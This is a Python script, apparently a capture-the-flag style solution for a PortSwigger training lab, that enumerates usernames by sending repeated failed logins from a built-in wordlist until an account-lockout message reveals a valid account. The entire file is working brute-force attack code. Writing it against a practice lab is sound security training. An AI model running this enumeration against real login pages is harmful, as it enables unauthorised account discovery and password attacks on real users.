#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Brute force script to exploit "Username enumeration via account lock" lab at
# "https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock".
#
# by Psycho (@UDPsycho)
#   Twitter: https://www.twitter.com/UDPsycho
#

import sys
import requests


if len(sys.argv) != 2:
  print ("\nUsage: {} https://<lab_url>/login\n".format(sys.argv[0]))

else:

  # Required for color output
  RED   = "\033[1;91m"
  GREEN = "\033[1;92m"
  CYAN  = "\033[96m"
  RESET = "\033[0m"

  target = sys.argv[1]

  payloads = ("carlos","root","admin","test","guest","info","adm","mysql","user","administrator","oracle","ftp","pi","puppet","ansible","ec2-user","vagrant","azureuser","academico","acceso","access","accounting","accounts","acid","activestat","ad","adam","adkit","admin","administracion","administrador","administrator","administrators","admins","ads","adserver","adsl","ae","af","affiliate","affiliates","afiliados","ag","agenda","agent","ai","aix","ajax","ak","akamai","al","alabama","alaska","albuquerque","alerts","alpha","alterwind","am","amarillo","americas","an","anaheim","analyzer","announce","announcements","antivirus","ao","ap","apache","apollo","app","app01","app1","apple","application","applications","apps","appserver","aq","ar","archie","arcsight","argentina","arizona","arkansas","arlington","as","as400","asia","asterix","at","athena","atlanta","atlas","att","au","auction","austin","auth","auto","autodiscover")
  error1   = "Invalid username or password."
  error2   = "You have made too many incorrect login attempts. Please try again in 1 minute(s)."

  MAX_LOGIN_ATTEMPTS_UNTIL_BAN = 5 # It's 4
  found_username = False


  print ("\nBruteforcing users, please wait...\n")

  for payload in payloads:

    data = { "username":payload, "password":"letmein" }
    i = 1

    while i <= MAX_LOGIN_ATTEMPTS_UNTIL_BAN:

      response = requests.post(target, data=data)

      if error1 in response.text:
        print ("  Login attempt #{} with user {}{}{} \t{}Failed{}"
          .format(i, CYAN, payload, RESET, RED, RESET))

        i+=1

      elif error2 in response.text:
        print ("  Login attempt #{} with user {}{}{} \t{}OK{}"
          .format(i, CYAN, payload, RESET, GREEN, RESET))

        found_username = True
        break

      else:
        print ("Operation aborted due the server responded with a {}{}{} status code.\n"
          .format(RED, response.status_code, RESET))

        exit(1)


    if found_username == True:
      print ("\nThe user {}{}{} exists!\n".format(GREEN, payload, RESET))

      break
